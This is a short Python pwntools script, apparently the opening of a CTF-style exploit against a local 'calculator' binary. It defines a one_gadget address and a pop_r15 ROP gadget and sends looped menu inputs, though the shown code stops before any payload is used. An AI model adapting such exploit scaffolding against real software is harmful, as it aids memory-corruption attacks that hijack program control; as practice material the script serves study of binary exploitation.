from pwn import * 
from LibcSearcher import * 
import random
context.log_level = 'debug' 
p=process('./calculator')
pause()
elf=ELF('./calculator')
one=0xe3b01
pop_r15=0x00000000000017a2
for i in range(5):
    p.recvuntil(b'option:')
    p.sendline(b'1')
    p.recvuntil(b'number: \n')
    p.sendline(b'8')
    for j in range(8):
        p.sendline(str(i).encode())
